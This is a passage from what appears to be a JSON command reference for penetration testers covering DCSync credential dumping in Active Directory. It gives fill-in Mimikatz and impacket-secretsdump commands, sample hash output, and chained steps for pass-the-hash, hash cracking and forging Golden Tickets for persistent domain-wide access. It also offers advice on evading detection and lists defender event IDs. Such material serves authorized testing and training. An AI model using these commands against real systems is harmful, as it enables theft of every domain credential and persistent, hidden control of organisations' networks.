{
  "metadata": {
    "file_purpose": "Active Directory DCSync Attack Commands - Domain Controller Credential Dumping via Directory Replication",
    "attack_summary": "DCSync abuses the Directory Replication Service Remote Protocol (MS-DRSR) to impersonate a domain controller and request password data via replication. No direct DC access needed - works remotely over RPC.",
    "prerequisites": [
      "Domain Admin, Enterprise Admin, or account with Replicating Directory Changes + Replicating Directory Changes All rights",
      "Network connectivity to DC (RPC ports 135 + ephemeral high ports)",
      "Valid domain credentials"
    ],
    "related_techniques": [
      "Pass-the-Hash",
      "Golden Ticket",
      "Credential Dumping",
      "NTDS.dit extraction"
    ],
    "created_date": "2025-11-10",
    "last_updated": "2025-11-10"
  },
  "commands": [
    {
      "id": "ad-dcsync-mimikatz-single-user",
      "name": "DCSync Single User with Mimikatz",
      "category": "post-exploit",
      "subcategory": "credential-dumping",
      "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN_FQDN> /user:<TARGET_USER>",
      "description": "Extract password hashes and Kerberos keys for a specific domain user by impersonating a domain controller and requesting credential replication. Faster and stealthier than full domain dumps.",
      "tags": [
        "ACTIVE_DIRECTORY",
        "DCSYNC",
        "CREDENTIAL_DUMPING",
        "POST_EXPLOITATION",
        "MIMIKATZ",
        "DOMAIN_ADMIN"
      ],
      "variables": [
        {
          "name": "DOMAIN_FQDN",
          "description": "Fully Qualified Domain Name of the target Active Directory domain",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "TARGET_USER",
          "description": "Username of the target account to dump credentials for. Common high-value targets: Administrator, krbtgt (for Golden tickets), or compromised admin accounts.",
          "example": "Administrator",
          "required": true
        }
      ],
      "flag_explanations": {
        "lsadump::dcsync": "Mimikatz module that implements the DCSync attack. Uses the Directory Replication Service Remote Protocol (MS-DRSR via DRSUAPI) to request credential data from a domain controller. Internally calls IDL_DRSGetNCChanges API, which is the same API legitimate DCs use to replicate Active Directory data. The DC receiving the request does NOT verify it came from another DC - it only checks that the requesting user's SID has replication rights (Replicating Directory Changes + Replicating Directory Changes All). By default, Domain Admins, Enterprise Admins, and Administrators groups have these rights. Time to execute: 1-5 seconds per user (network latency dependent).",
        "/domain": "Target domain FQDN. Mimikatz uses this to locate domain controllers via DNS SRV record queries (_ldap._tcp.dc._msdcs.<domain>). If omitted, uses current user's domain. MUST be FQDN (corp.com), not NetBIOS (CORP). If targeting child domain in forest, specify child domain FQDN. Alternative: /dc:<dc_fqdn> to target specific DC (useful if DNS resolution fails or you want to avoid primary DC for OPSEC).",
        "/user": "Target username to extract credentials for. Format: username (not DOMAIN\\username). Mimikatz queries the DC for this user's password data including NTLM hash, LM hash (if exists), Kerberos keys (AES256, AES128, DES), password history (previous hashes), and supplemental credentials. HIGH-VALUE TARGETS:\n- Administrator: Domain admin account (RID 500)\n- krbtgt: Key Distribution Center service account - its NTLM hash is used to create Golden Tickets\n- Domain admin usernames: Identified via 'net group \"Domain Admins\" /domain'\n- Service accounts with admin rights: Often have long, complex passwords (good for Golden/Silver tickets)\n\nCase-insensitive. Supports SAMAccountName format only (not UPN like user@corp.com). To dump computer account: append $ (e.g., /user:DC1$)."
      },
      "success_indicators": [
        "Output: '[DC] 'corp.com' will be the domain' - Confirms domain targeting",
        "Output: '[DC] 'DC1.corp.com' will be the DC server' - Shows which DC responded",
        "Output: '[DC] '<user>' will be the user account' - Confirms target user",
        "Output: 'Hash NTLM: <32_hex_chars>' - NTLM hash successfully extracted",
        "Output: 'ntlm- 0: <hash>' - Current NTLM hash (ntlm-1, ntlm-2 are password history)",
        "Output: 'aes256-cts-hmac-sha1-96: <64_hex_chars>' - Kerberos AES256 key extracted",
        "Credentials section populated with multiple hash types (NTLM, LM, Kerberos keys)"
      ],
      "failure_indicators": [
        "ERROR: Access denied - Current user lacks replication rights (not Domain Admin or missing ACL permissions)",
        "ERROR: The specified domain either does not exist or could not be contacted - Network issue, DC unreachable, or wrong domain name",
        "ERROR: The object does not exist - Target username not found in domain (typo or user doesn't exist)",
        "ERROR: RPC server is unavailable - Firewall blocking RPC (port 135), or DC offline",
        "ERROR: ERROR kuhl_m_lsadump_dcsync ; GetNCChanges - Replication request rejected by DC (insufficient permissions)"
      ],
      "troubleshooting": {
        "Access denied / insufficient permissions": "DIAGNOSIS: User lacks required replication rights. REQUIRED RIGHTS:\n1. DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)\n2. DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)\n\nVERIFY PERMISSIONS:\n# Check if current user has replication rights (PowerView):\nGet-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication') -and ($_.SecurityIdentifier -match $(ConvertTo-SID $env:USERNAME))}\n\n# Expected output: ObjectAceType should show 'DS-Replication-Get-Changes' and 'DS-Replication-Get-Changes-All'\n\nSOLUTIONS:\n1. Use Domain Admin account: net group \"Domain Admins\" /domain (identify DA accounts, use those credentials)\n2. Use Enterprise Admin (if multi-domain forest)\n3. Check if current user is actually in DA group: whoami /groups | findstr \"Domain Admins\"\n4. If you have local admin on DC: Dump NTDS.dit directly instead (ntdsutil, vssadmin, or impacket-secretsdump -ntds)\n\nCOMMON MISTAKE: User is local admin on member server but NOT domain admin (local admin \u2260 domain admin).",
        "RPC server unavailable / network errors": "DIAGNOSIS: Network connectivity issue between client and DC. DCSync requires RPC over TCP.\n\nREQUIRED PORTS:\n- TCP 135: RPC Endpoint Mapper (initial connection)\n- TCP 49152-65535: Ephemeral high ports (actual RPC communication, dynamically assigned)\n- TCP 445: SMB (for name resolution and authentication)\n- TCP/UDP 88: Kerberos (for authentication)\n- TCP/UDP 389: LDAP (for DC discovery)\n\nTROUBLESHOOTING STEPS:\n1. Verify DC reachability: ping DC1.corp.com\n2. Test RPC port: Test-NetConnection -ComputerName DC1.corp.com -Port 135\n3. Test SMB: dir \\\\DC1.corp.com\\C$ (if accessible, network path is good)\n4. Check firewall rules on client (outbound) and DC (inbound)\n5. Verify DNS resolution: nslookup DC1.corp.com (should resolve to DC IP)\n\nWORKAROUNDS:\n- If RPC blocked: Use impacket-secretsdump from Linux (may bypass Windows firewall rules)\n- If remote DCSync blocked: Get local admin on DC, dump NTDS.dit directly\n- Specify alternate DC: mimikatz # lsadump::dcsync /domain:corp.com /dc:DC2.corp.com /user:Administrator",
        "Target user not found": "DIAGNOSIS: Username typo, user doesn't exist, or deleted account.\n\nVERIFY USER EXISTS:\n# PowerShell:\nGet-ADUser -Identity <username>\n# Alternative:\nnet user <username> /domain\n\nCOMMON MISTAKES:\n1. Using DOMAIN\\username format (WRONG) - Use just 'username' without domain prefix\n2. Using UPN format (WRONG) - Use SAMAccountName (username, not user@corp.com)\n3. Case sensitivity (usually fine) - But verify exact spelling: Get-ADUser -Filter \"Name -like '*admin*'\"\n4. Deleted accounts - Check recycle bin: Get-ADObject -IncludeDeletedObjects -Filter {Name -eq '<username>'}\n\nFOR COMPUTER ACCOUNTS:\n- Append $ to name: /user:DC1$ (dump domain controller machine account)\n- Useful for dumping DC credentials (can be used for Silver tickets against DC services)",
        "Need to dump krbtgt for Golden Ticket but getting errors": "KRBTGT is a SPECIAL ACCOUNT (Key Distribution Center service account). Its NTLM hash is used to sign TGTs (Ticket Granting Tickets), making it the key to Golden Ticket attacks.\n\nCOMMAND:\nmimikatz # lsadump::dcsync /domain:corp.com /user:krbtgt\n\nEXPECTED OUTPUT:\nHash NTLM: <32_hex_chars> \u2190 This is what you need for Golden Tickets\n\nCOMMON ISSUES:\n1. 'Object does not exist' - krbtgt should ALWAYS exist (created during domain setup). If missing, domain is corrupted. Try: /user:KRBTGT (uppercase)\n2. Access denied - Same permission requirements (Domain Admin or replication rights)\n3. Hash shows as 'null' - Extremely rare, indicates domain corruption\n\nONCE OBTAINED:\n1. Record NTLM hash: Write it down, store securely (this hash persists for YEARS)\n2. Create Golden Ticket: mimikatz # kerberos::golden /domain:corp.com /sid:<domain_sid> /krbtgt:<ntlm_hash> /user:fakeadmin /ptt\n3. Golden ticket grants DOMAIN-WIDE access (vs Silver ticket which is service-specific)\n\nKRBTGT PASSWORD ROTATION:\n- Microsoft recommends rotating krbtgt password twice (double rotation) to invalidate all Golden Tickets\n- In practice, krbtgt password is RARELY changed (persists for months/years)\n- If password changes mid-engagement, your Golden Tickets become invalid"
      },
      "notes": "METHODOLOGY - WHEN TO USE DCSYNC:\nDCSync is a POST-EXPLOITATION technique used AFTER obtaining Domain Admin or equivalent rights.\n\nTypical pentest workflow:\n1.\n\nINITIAL ACCESS:\nCompromise domain-joined machine (password spray, AS-REP roast, web exploit)\n2.\n\nLOCAL PRIVILEGE ESCALATION:\nBecome local admin (AlwaysInstallElevated, SeImpersonate, kernel exploit)\n3.\n\nLATERAL MOVEMENT:\nMove to higher-value targets (pass-the-hash, overpass-the-hash, Kerberos delegation)\n4.\n\nDOMAIN ADMIN COMPROMISE:\nObtain DA credentials (LSASS dump, credential harvesting, Kerberoasting admin account)\n5.\n\n**DCSYNC**:\nDump all domain credentials for persistence and complete control\n6.\n\nGOLDEN TICKET:\nUse krbtgt hash for persistent domain-wide access\n\nWHY DCSYNC INSTEAD OF NTDS.DIT EXTRACTION:\nTRADITIONAL METHOD (NTDS.dit dump):\n- Requires LOCAL ADMIN on domain controller (higher bar)\n- Requires DIRECT ACCESS to DC (RDP, PSExec, WinRM)\n- Generates DISK I/O (create VSS snapshot, copy NTDS.dit file)\n- Slower (NTDS.dit is 100MB-10GB+, takes minutes to transfer)\n- More forensic artifacts (file creation, VSS snapshot, disk access logs)\n\nDCSYNC METHOD:\n- Requires Domain Admin OR replication rights (same privilege level, different approach)\n- Works REMOTELY (no need to log into DC)\n- NO disk access (pure network operation over RPC)\n- Faster for single users (1-5 seconds per user)\n- Less forensic artifacts (appears as normal replication traffic)\n- Stealthier (Event ID 4662 on DC, but replication traffic is common)\n\nWHEN TO USE EACH:\n- Use DCSync:\nWhen you have DA rights from remote machine, want specific user hashes quickly, need stealth\n- Use NTDS.dit:\nWhen you have local admin on DC but NOT domain admin, want complete offline analysis, DCSync is detected/blocked\n\nMANUAL ALTERNATIVES (if Mimikatz unavailable):\nImpacket secretsdump (Linux):\nimpacket-secretsdump -just-dc-user <username> corp.com/administrator:password@DC1.corp.com\n- Achieves same result as Mimikatz DCSync\n- Works from Linux (Kali in pentest)\n- Output format:\ndomain\\user:RID:LMhash:NThash:::\n- See ad-dcsync-impacket-secretsdump-user command for details\n\nSharpKatz (C# alternative to Mimikatz):\nSharpKatz.exe --Command dcsync --User <username> --Domain corp.com --DomainController DC1.corp.com\n- Modern C# implementation\n- Better OPSEC (fewer signatures than Mimikatz)\n- Requires .NET 4.5+\n\nDCSYNC OUTPUT EXPLANATION:\nEXAMPLE OUTPUT:\nmimikatz # lsadump::dcsync /domain:corp.com /user:Administrator\n[DC] 'corp.com' will be the domain\n[DC] 'DC1.corp.com' will be the DC server\n[DC] 'corp\\Administrator' will be the user account\n\nObject RDN:\nAdministrator\n\n** SAM ACCOUNT **\nSAM Username:\nAdministrator\nAccount Type:\n30000000 ( USER_OBJECT )\nUser Account Control:\n00000200 ( NORMAL_ACCOUNT )\nAccount expiration:\nPassword last change:\n9/7/2022 9:54:57 AM \u2190 Last password change\nObject Security ID:\nS-1-5-21-1987370270-658905905-1781884369-500\nObject Relative ID:\n500 \u2190 RID 500 = Domain Administrator\n\nCredentials:\n  Hash NTLM:\n2892d26cdf84d7a70e2eb3b9f05c425e \u2190 PRIMARY TARGET (use for PTH, Golden tickets)\n  ntlm- 0:\n2892d26cdf84d7a70e2eb3b9f05c425e \u2190 Current NTLM hash\n  ntlm- 1:\na11e808659d5ec5b6c4f43c1e5a0972d \u2190 Password history (previous hash)\n  lm  - 0:\n45bc7d437911303a42e764eaf8fda43e \u2190 LM hash (legacy, ignore unless old systems)\n\nKerberos keys (for AES-based attacks):\n  aes256-cts-hmac-sha1-96:\n<64_hex_chars> \u2190 AES256 key (use for stealthier Kerberos attacks)\n  aes128-cts-hmac-sha1-96:\n<32_hex_chars> \u2190 AES128 key\n  des-cbc-md5:\n<16_hex_chars> \u2190 DES key (legacy, weak)\n\nWHAT TO EXTRACT:\n1.\n\n**NTLM hash (primary)**:\nUse for Pass-the-Hash, crack for plaintext password, use in Silver/Golden tickets\n2.\n\n**Kerberos AES256 key**:\nUse for stealthier Kerberos attacks (AES preferred over RC4 in modern environments)\n3.\n\n**Password history**:\nIf current password is complex, try cracking historical passwords (users often increment:\nPassword1 \u2192 Password2)\n4.\n\n**RID**:\nIdentifies account type (500=Administrator, 502=krbtgt, 1000+=custom users)\n5.\n\n**Password last change**:\nRecent change may indicate active use (target for additional exploitation)\n\nTIME ESTIMATES FOR PRACTICAL:\n- Single user DCSync:\n1-5 seconds (network latency dependent)\n- Crack NTLM hash (if needed):\n5-30 minutes (depends on password complexity, wordlist size)\n- Create Golden Ticket from krbtgt hash:\n<1 minute\n- TOTAL (from DA to Golden Ticket):\n5-10 minutes\n\nIf DCSync fails (permissions or network issues):\nFall back to NTDS.dit extraction (10-30 minutes including transfer and parsing)\n\nDETECTION AND OPSEC:\nEVENT IDS GENERATED:\n- **Event ID 4662** on Domain Controller:\n\"An operation was performed on an object\" with:\n  - Properties:\n{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (Replicating Directory Changes)\n  - Properties:\n{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} (Replicating Directory Changes All)\n- **Event ID 4624**:\nLogon Type 3 (Network logon) from DCSync source machine\n- **Event ID 5156**:\nWindows Filtering Platform (RPC connection to DC)\n\nDETECTION INDICATORS (Blue Team Perspective):\n- Replication request from NON-DC machine (legitimate replication is DC-to-DC only)\n- User account (not computer account) performing replication (DCs use MACHINE$ accounts)\n- Replication outside normal schedule (production environments have scheduled replication windows)\n- Single object replication (unusual - DCs replicate entire partitions, not individual users)\n- Source IP is workstation/server, not DC IP range\n\nOPSEC IMPROVEMENTS:\n1.\n\n**Target specific users only**:\nAvoid /all dumps (loud, slow, generates massive logs)\n2.\n\n**Use compromised DC computer account**:\nIf you've compromised a DC, use its machine account for DCSync (appears legitimate)\n3.\n\n**Timing**:\nPerform during business hours when replication traffic is normal (not 3am)\n4.\n\n**Space out requests**:\nDon't dump 100 users in 30 seconds (automated tool pattern)\n5.\n\n**Use legitimate admin account**:\nIf you've compromised real DA account, use it (not 'hacker' or 'pwned' accounts)\n\nCOMMON PRACTICAL SCENARIO:\nYou've compromised a domain user 'jeff' on WORKSTATION03.\n\nAfter local privilege escalation and lateral movement, you discover 'adminuser' (Domain Admin) has an active session on WORKSTATION03.\n\nYou dump LSASS and obtain adminuser's NTLM hash.\n\nNEXT STEPS:\n1.\n\nPass-the-hash as adminuser:\nimpacket-wmiexec -hashes :ntlm_hash corp.com/adminuser@DC1.corp.com\n2.\n\nDCSync krbtgt:\nmimikatz # lsadump::dcsync /domain:corp.com /user:krbtgt\n3.\n\nRecord krbtgt NTLM hash:\n4d28cf5252d39971419580a51484ca09\n4.\n\nExtract Domain SID:\nwhoami /user \u2192 S-1-5-21-1987370270-658905905-1781884369\n5.\n\nCreate Golden Ticket:\nmimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:4d28cf5252d39971419580a51484ca09 /user:fakeadmin /ptt\n6.\n\nAccess ANY resource:\ndir \\\\DC1\\C$, Enter-PSSession -ComputerName DC1, etc.\n\nDCSYNC VS KERBEROASTING (attack chain):\nKERBEROASTING (pre-compromise):\n- Target:\nService accounts with SPNs\n- Privilege:\nAny domain user (low-privilege)\n- Result:\nTGS-REP encrypted with service account password\n- Next step:\nCrack offline to get service account password\n\nDCSYNC (post-compromise):\n- Target:\nANY domain account (users, admins, service accounts, computer accounts)\n- Privilege:\nDomain Admin or replication rights (high-privilege)\n- Result:\nNTLM hash, Kerberos keys (no cracking needed)\n- Next step:\nUse hash directly (PTH, Golden/Silver tickets)\n\nTHEY'RE COMPLEMENTARY:\n- Kerberoasting gets you INTO domain admin (crack service account with admin rights)\n- DCSync gets you PERSISTENCE after domain admin (dump krbtgt for Golden tickets)\n\nKEY DIFFERENCES FROM GOLDEN TICKET:\nDCSYNC:\n- Dumps credentials (NTLM hashes, Kerberos keys)\n- Requires execution (run Mimikatz/secretsdump)\n- Active operation (network traffic, logs generated)\n- Used to OBTAIN krbtgt hash\n\nGOLDEN TICKET:\n- Forges Kerberos TGT (Ticket Granting Ticket)\n- Uses krbtgt hash obtained via DCSync\n- Grants persistent domain-wide access\n- Used AFTER DCSync to create persistence\n\nWORKFLOW:\nDCSync krbtgt \u2192 Extract NTLM hash \u2192 Create Golden Ticket \u2192 Persistent access\n\nFINAL PRACTICAL TIPS:\n1.\n\n**Always DCSync krbtgt first**:\nEven if you only need one user's hash, grab krbtgt for Golden Ticket persistence\n2.\n\n**Document all hashes**:\nCreate a 'hashes.txt' file with format:\nusername:NTLM_hash\n3.\n\n**Crack hashes offline**:\nDon't crack on exam machines (slow, resource-intensive).\n\nCopy hashes to Kali, use Hashcat\n4.\n\n**Test hashes immediately**:\nVerify hashes work with crackmapexec before building Golden/Silver tickets\n5.\n\n**Backup method**:\nIf DCSync fails, immediately pivot to NTDS.dit extraction (don't waste time troubleshooting)\n6.\n\n**Multiple DCs**:\nIf domain has multiple DCs, try different ones if primary DC fails (DC2, DC3, etc.)\n7.\n\n**Time management**:\nDCSync should take <10 minutes total.\n\nIf longer, move on to other targets\n\nPRACTICE EXERCISES:\n1.\n\nMemorize syntax:\nlsadump::dcsync /domain:<domain> /user:<user>\n2.\n\nPractice identifying replication rights:\nGet-DomainObjectAcl with ResolveGUIDs\n3.\n\nPractice both Mimikatz and impacket methods (Windows and Linux)\n4.\n\nSimulate:\nCompromise DA \u2192 DCSync krbtgt \u2192 Golden Ticket \u2192 Access DC \u2192 Dump NTDS.dit (full chain)\n5.\n\nTroubleshoot:\nIntentionally use non-DA account, observe errors, practice permission verification",
      "alternatives": [
        "ad-dcsync-impacket-secretsdump-user",
        "ad-dcsync-mimikatz-user"
      ],
      "next_steps": [
        "ad-golden-ticket-mimikatz-create",
        "hashcat-crack"
      ],
      "prerequisites": [
        "ad-dcsync-check-domain-admins",
        "ad-dcsync-check-permissions"
      ],
      "filled_example": "mimikatz # lsadump::dcsync /domain:<corp.com> /user:<Administrator>"
    },
    {
      "id": "ad-dcsync-impacket-secretsdump-user",
      "name": "DCSync Single User with impacket-secretsdump",
      "category": "post-exploit",
      "subcategory": "credential-dumping",
      "command": "impacket-secretsdump -just-dc-user <TARGET_USER> '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>'",
      "description": "Linux-based DCSync attack using impacket-secretsdump to extract a specific user's credentials via DRSUAPI replication. Ideal for security work Kali-based attacks.",
      "tags": [
        "ACTIVE_DIRECTORY",
        "DCSYNC",
        "CREDENTIAL_DUMPING",
        "POST_EXPLOITATION",
        "IMPACKET",
        "LINUX",
        "KALI"
      ],
      "variables": [
        {
          "name": "TARGET_USER",
          "description": "Username of the target account to dump credentials for",
          "example": "Administrator",
          "required": true
        },
        {
          "name": "DOMAIN",
          "description": "NetBIOS domain name (CORP) or FQDN (corp.com) - both work",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "USERNAME",
          "description": "Domain admin username (or user with replication rights) to authenticate as",
          "example": "administrator",
          "required": true
        },
        {
          "name": "PASSWORD",
          "description": "Password for the authenticating user. Escape special characters with backslash (\\! for !).",
          "example": "Password123!",
          "required": true
        },
        {
          "name": "DC_IP",
          "description": "IP address or FQDN of the domain controller. IP is more reliable (avoids DNS issues).",
          "example": "10.10.10.70",
          "required": true
        }
      ],
      "flag_explanations": {
        "-just-dc-user": "Extracts credentials for ONLY the specified user using DRSUAPI (Directory Replication Service API). This is the DCSync operation - impacket impersonates a domain controller and requests credential replication for the target user. OUTPUT FORMAT: domain\\user:RID:LMhash:NThash::: followed by Kerberos keys. COMPARISON:\n- -just-dc-user <user>: Single user (fast, 1-5 seconds, stealthy)\n- -just-dc-ntlm: All users, NTLM hashes only (faster than -just-dc, 30-120 seconds)\n- -just-dc: All users, full credential dump (NTLM, Kerberos keys, password history, 1-10 minutes)\n\nFor security assessment: Use -just-dc-user for targeted extraction (krbtgt, specific admin). Use -just-dc-ntlm for full domain dump if needed.\n\nWHY 'just-dc': Indicates DCSync method (vs -sam for SAM database, -ntds for NTDS.dit file extraction, -security for SECURITY hive).",
        "DOMAIN/USERNAME:PASSWORD@DC_IP": "Authentication string format. COMPONENTS:\n- DOMAIN: Can be NetBIOS (CORP) or FQDN (corp.com) - secretsdump handles both\n- USERNAME: Domain admin or user with replication rights (Domain Admins, Enterprise Admins, or custom ACL)\n- PASSWORD: Plaintext password. SPECIAL CHARACTERS: Bash interprets !, $, `, etc. - escape with backslash OR use single quotes around entire command\n- DC_IP: Domain controller IP or FQDN. RECOMMENDATION: Use IP to avoid DNS issues (10.10.10.70 instead of DC1.corp.com)\n\nALTERNATIVE AUTHENTICATION FORMATS:\n- Hash authentication: -hashes :NTLM_HASH (Pass-the-Hash)\n  Example: impacket-secretsdump -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp.com/administrator@10.10.10.70\n- Kerberos ticket: -k -no-pass (requires TGT in KRB5CCNAME cache)\n- AES key: -aesKey <hex_key> (Kerberos authentication with AES key)\n\nQUOTING RULES:\n- Single quotes: '<domain>/<user>:<pass>@<dc>' - Prevents bash expansion (RECOMMENDED)\n- Double quotes: \"<domain>/<user>:<pass>@<dc>\" - Bash expands variables/special chars (use \\! for !)\n- No quotes: Fails if password contains special chars (!, $, `, &, |, ;, <, >, etc.)"
      },
      "success_indicators": [
        "Output: 'Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation'",
        "Output: '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)'",
        "Output: '[*] Using the DRSUAPI method to get NTDS.DIT secrets' - Confirms DCSync",
        "Output: 'user:RID:LMhash:NThash:::' - Credentials successfully dumped",
        "Format: corp\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::",
        "Kerberos keys listed: aes256-cts-hmac-sha1-96, aes128-cts-hmac-sha1-96, des-cbc-md5",
        "Output: '[*] Cleaning up...' - Successful completion"
      ],
      "failure_indicators": [
        "ERROR: [-] RemoteOperations failed: DCERPC Runtime Error - Insufficient permissions (not Domain Admin)",
        "ERROR: [-] SMB SessionError: STATUS_LOGON_FAILURE - Wrong username/password",
        "ERROR: [-] [Errno Connection error] Connection timed out - DC unreachable (firewall, wrong IP, DC offline)",
        "ERROR: [-] User '<user>' not found - Target username doesn't exist in domain",
        "ERROR: [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN - Authenticating user doesn't exist"
      ],
      "troubleshooting": {
        "RemoteOperations failed / DCERPC Runtime Error": "DIAGNOSIS: User lacks replication rights. REQUIRED: Domain Admin, Enterprise Admin, or explicit replication ACLs.\n\nVERIFY PERMISSIONS:\n# From Windows (PowerView):\nGet-NetGroupMember -GroupName 'Domain Admins' | Select MemberName\n# Check if your user is in the list\n\n# From Linux:\nimpacket-GetADUsers -all corp.com/user:pass -dc-ip 10.10.10.70 | grep -i 'Domain Admins'\n\nSOLUTIONS:\n1. Verify you're using Domain Admin account (not just local admin)\n2. Try alternative DA account: net group \"Domain Admins\" /domain (list all DAs, try different one)\n3. Use Enterprise Admin if available (higher privilege)\n4. Check for typos in username (case-insensitive but spelling must be exact)\n5. If you have local admin on DC but NOT domain admin: Use NTDS.dit extraction instead (-ntds flag)\n\nCOMMON MISTAKE: Local administrator on member server \u2260 Domain Administrator. Verify group membership.",
        "Special characters in password breaking command": "BASH SPECIAL CHARACTERS: ! $ ` \\ \" ' & | ; < > ( ) [ ] { } * ? ~ #\n\nSOLUTIONS:\n\n1. SINGLE QUOTES (RECOMMENDED):\nimpacket-secretsdump -just-dc-user Administrator 'corp.com/admin:P@ssw0rd!@2023@10.10.10.70'\n- Single quotes prevent ALL bash expansion (!, $, etc. are literal)\n- Exception: Can't use single quote inside single-quoted string\n\n2. ESCAPE WITH BACKSLASH:\nimpacket-secretsdump -just-dc-user Administrator corp.com/admin:P@ssw0rd\\!@2023@10.10.10.70\n- Backslash escapes next character (\\! becomes literal !)\n- Must escape EACH special char (\\!, \\$, \\`, etc.)\n\n3. PASSWORD FILE:\necho 'P@ssw0rd!@2023' > pass.txt\nimpacket-secretsdump -just-dc-user Administrator corp.com/admin@10.10.10.70 < pass.txt\n- Avoids command-line password (less risk of typos, shell history)\n\n4. PASS-THE-HASH (if you have NTLM hash):\nimpacket-secretsdump -just-dc-user Administrator -hashes :NTLM_HASH corp.com/admin@10.10.10.70\n- No password needed (hash doesn't have special chars)\n\nEXAMPLES:\n- Password: Password! \u2192 'corp.com/admin:Password!@10.10.10.70'\n- Password: P@$$w0rd \u2192 'corp.com/admin:P@$$w0rd@10.10.10.70'\n- Password: Pass`word \u2192 'corp.com/admin:Pass`word@10.10.10.70'",
        "Connection timeout / DC unreachable": "DIAGNOSIS: Network connectivity issue.\n\nTROUBLESHOOTING STEPS:\n\n1. VERIFY DC IS REACHABLE:\nping <dc_ip>\n# Should respond (if ICMP not blocked)\n\n2. TEST SMB CONNECTIVITY (port 445):\nsmbclient -L //<dc_ip> -U <domain>/<username>%<password>\n# Should list shares if SMB works\n\n3. TEST RPC PORT (135):\nnc -zv <dc_ip> 135\n# Should show 'open' if RPC accessible\n\n4. TEST LDAP (389):\nldapsearch -H ldap://<dc_ip> -x -b \"DC=corp,DC=com\"\n# Should return LDAP data\n\n5. CHECK FIREWALL RULES:\n# If on VPN/lab network, verify routing:\nip route get <dc_ip>\n# Should show route via correct interface\n\n6. VERIFY DC IS ONLINE:\n# Try different DC:\nnslookup -type=SRV _ldap._tcp.dc._msdcs.corp.com\n# Lists all DCs - try alternative DC IP\n\nWORKAROUNDS:\n- Use DC FQDN instead of IP: impacket-secretsdump ... corp.com/admin:pass@DC1.corp.com\n- Try alternative DC: @DC2.corp.com, @10.10.10.71\n- Check VPN/network connectivity: ifconfig, route -n\n- Verify time sync: timedatectl (Kerberos requires time sync within 5 minutes)",
        "Output format parsing / using dumped hashes": "SECRETSDUMP OUTPUT FORMAT:\ncorp\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::\n\nFORMAT BREAKDOWN:\n- corp\\Administrator: Domain\\Username\n- 500: RID (Relative Identifier) - 500=Domain Admin\n- aad3b435b51404eeaad3b435b51404ee: LM hash (this specific value means 'empty LM hash')\n- 2892d26cdf84d7a70e2eb3b9f05c425e: **NTLM hash** \u2190 THIS IS WHAT YOU NEED\n- ::: Empty fields (unused)\n\nEXTRACT NTLM HASH:\n# Manual: Copy the 4th field (after 3rd colon)\n# Automated:\nimpacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@10.10.10.70' | grep 'Administrator' | cut -d ':' -f 4\n# Output: 2892d26cdf84d7a70e2eb3b9f05c425e\n\nUSE CASES:\n\n1. PASS-THE-HASH:\nimpacket-wmiexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp.com/Administrator@10.10.10.70\n\n2. CRACK WITH HASHCAT:\necho '2892d26cdf84d7a70e2eb3b9f05c425e' > hash.txt\nhashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt\n\n3. GOLDEN TICKET (if dumping krbtgt):\nimpacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@10.10.10.70'\n# Extract krbtgt NTLM hash, use in: impacket-ticketer -nthash <krbtgt_hash> ...\n\n4. STORE IN CREDENTIALS FILE:\necho 'Administrator:2892d26cdf84d7a70e2eb3b9f05c425e' >> creds.txt\n# Format for crackmapexec, evil-winrm, etc.\n\nKERBEROS KEYS (also in output):\naes256-cts-hmac-sha1-96: 8a7e...  \u2190 Use for AES-based Kerberos attacks (stealthier than RC4)\n- USE: impacket-getTGT -aesKey 8a7e... corp.com/Administrator"
      },
      "notes": "METHODOLOGY - LINUX-BASED DCSYNC:\nimpacket-secretsdump is the PREFERRED DCSync method from Kali Linux during pentests.\n\nIt achieves identical results to Mimikatz lsadump::dcsync but from a non-Windows attack platform.\n\nWHY USE IMPACKET INSTEAD OF MIMIKATZ:\n\u2705 ADVANTAGES:\n1.\n\n**Cross-platform**:\nWorks from Kali Linux (your primary attack platform in pentests)\n2.\n\n**No AV/EDR**:\nDoesn't execute on target (runs from Kali, only network traffic to DC)\n3.\n\n**Pre-installed**:\nIncluded in Kali by default (apt install impacket-scripts if missing)\n4.\n\n**Scriptable**:\nEasy to automate (bash scripts, loop through multiple users)\n5.\n\n**Clean output**:\nMachine-parseable format (easier to extract hashes programmatically)\n\n\u274c DISADVANTAGES:\n1.\n\n**Requires network access**:\nMust route to DC from Kali (VPN, pivoting, or direct network)\n2.\n\n**Less features**:\nMimikatz has more Kerberos manipulation options (PTT, ticket exports)\n3.\n\n**Password complexity**:\nBash special characters can be tricky (but solvable with quoting)\n\n\ud83c\udfaf PRACTICAL DECISION:\n- Use impacket-secretsdump:\nWhen attacking from Kali (most common), have network access to DC\n- Use Mimikatz:\nWhen already on Windows machine with DA session, need advanced Kerberos features\n\nTYPICAL PRACTICAL WORKFLOW:\n1.\n\n**INITIAL COMPROMISE** (from Kali):\n   - Password spray with crackmapexec\n   - AS-REP roast with impacket-GetNPUsers\n   - Kerberoast with impacket-GetUserSPNs\n   Result:\nValid domain credentials (user:password or user:hash)\n\n2.\n\n**LATERAL MOVEMENT** (from Kali):\n   - Pass-the-hash to higher-value targets with impacket-wmiexec\n   - Dump LSASS on remote machines with impacket-secretsdump -sam/-security/-system\n   Result:\nDomain Admin NTLM hash 